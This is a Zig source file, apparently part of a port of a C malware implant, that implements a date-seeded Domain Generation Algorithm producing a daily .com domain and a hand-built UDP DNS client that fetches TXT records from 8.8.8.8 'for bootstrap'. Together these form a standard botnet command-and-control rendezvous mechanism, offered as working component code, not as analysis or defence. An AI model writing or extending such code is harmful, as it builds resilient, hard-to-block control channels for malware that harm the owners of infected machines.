//! # DNS Resolver + DGA
//!
//! TXT record resolution for bootstrap and Domain Generation Algorithm.
//!
//! ## C Reference: modules/network/dns/

const std = @import("std");
const posix = std.posix;

// ============================================================
// DGA (from C: dns/dga.h, dga.c)
// ============================================================

/// Domain Generation Algorithm
/// Generates daily domain based on date
pub fn dgaGetDomain(buffer: []u8) []u8 {
    const timestamp = std.time.timestamp();
    const days = @divTrunc(timestamp, 86400); // Days since epoch

    // Simple DGA: hash of day + constant
    var hash: u32 = 0x5AFE;
    var day_val: u32 = @truncate(@as(u64, @bitCast(days)));

    var i: usize = 0;
    while (i < 8 and i < buffer.len - 4) : (i += 1) {
        hash ^= day_val;
        hash = hash *% 0x41C64E6D +% 0x3039;
        day_val >>= 4;

        // Generate lowercase letter
        buffer[i] = @as(u8, @truncate(hash % 26)) + 'a';
    }

    // Add TLD
    const domain_len = i;
    if (domain_len + 4 <= buffer.len) {
        buffer[domain_len] = '.';
        buffer[domain_len + 1] = 'c';
        buffer[domain_len + 2] = 'o';
        buffer[domain_len + 3] = 'm';
        return buffer[0 .. domain_len + 4];
    }

    return buffer[0..domain_len];
}

// ============================================================
// DNS TXT RESOLUTION (from C: dns/dns.c dns_resolve_txt)
// ============================================================

/// Resolve TXT record via UDP DNS query
/// Returns true on success, false on failure
pub fn resolveTxt(domain: []const u8, result: []u8) !usize {
    const sock = try posix.socket(posix.AF.INET, posix.SOCK.DGRAM, 0);
    defer posix.close(sock);

    // DNS server: 8.8.8.8:53
    var dns_addr: posix.sockaddr.in = .{
        .family = posix.AF.INET,
        .port = std.mem.nativeToBig(u16, 53),
        .addr = std.mem.nativeToBig(u32, 0x08080808), // 8.8.8.8
    };

    // Build DNS query
    var query: [512]u8 = undefined;
    const query_len = buildDnsQuery(domain, &query);

    // Send query
    _ = try posix.sendto(sock, query[0..query_len], 0, @ptrCast(&dns_addr), @sizeOf(posix.sockaddr.in));

    // Set timeout
    const timeout = posix.timeval{ .sec = 5, .usec = 0 };
    posix.setsockopt(sock, posix.SOL.SOCKET, posix.SO.RCVTIMEO, std.mem.asBytes(&timeout)) catch {};

    // Receive response
    var response: [512]u8 = undefined;
    const resp_len = try posix.recv(sock, &response, 0);

    // Parse TXT record from response
    return parseTxtResponse(response[0..resp_len], result);
}

fn buildDnsQuery(domain: []const u8, buffer: []u8) usize {
    var offset: usize = 0;

    // Transaction ID
    buffer[offset] = 0xAA;
    buffer[offset + 1] = 0xBB;
    offset += 2;

    // Flags: standard query
    buffer[offset] = 0x01;
    buffer[offset + 1] = 0x00;
    offset += 2;

    // Questions: 1
    buffer[offset] = 0x00;
    buffer[offset + 1] = 0x01;
    offset += 2;

    // Answer/Authority/Additional RRs: 0
    @memset(buffer[offset .. offset + 6], 0);
    offset += 6;

    // Encode domain name (label format)
    var domain_copy = domain;
    while (domain_copy.len > 0) {
        // Find next dot
        var label_len: usize = 0;
        while (label_len < domain_copy.len and domain_copy[label_len] != '.') : (label_len += 1) {}

        buffer[offset] = @truncate(label_len);
        offset += 1;
        @memcpy(buffer[offset .. offset + label_len], domain_copy[0..label_len]);
        offset += label_len;

        if (label_len < domain_copy.len) {
            domain_copy = domain_copy[label_len + 1 ..];
        } else {
            break;
        }
    }

    // Null terminator
    buffer[offset] = 0;
    offset += 1;

    // Type: TXT (16)
    buffer[offset] = 0x00;
    buffer[offset + 1] = 0x10;
    offset += 2;

    // Class: IN (1)
    buffer[offset] = 0x00;
    buffer[offset + 1] = 0x01;
    offset += 2;

    return offset;
}

fn parseTxtResponse(response: []const u8, result: []u8) usize {
    if (response.len < 12) return 0;

    // Skip header (12 bytes) + question section
    var offset: usize = 12;

    // Skip question name
    while (offset < response.len and response[offset] != 0) {
        if (response[offset] & 0xC0 == 0xC0) {
            offset += 2;
            break;
        }
        offset += @as(usize, response[offset]) + 1;
    }
    offset += 1; // null terminator
    offset += 4; // type + class

    // Parse answer
    if (offset + 12 > response.len) return 0;

    // Skip name pointer + type + class + ttl
    offset += 10;

    const rdlength = std.mem.readInt(u16, response[offset..][0..2], .big);
    offset += 2;

    if (offset + rdlength > response.len) return 0;

    // TXT format: [length][data]
    const txt_len = response[offset];
    offset += 1;

    const copy_len = @min(@as(usize, txt_len), result.len);
    @memcpy(result[0..copy_len], response[offset .. offset + copy_len]);

    return copy_len;
}
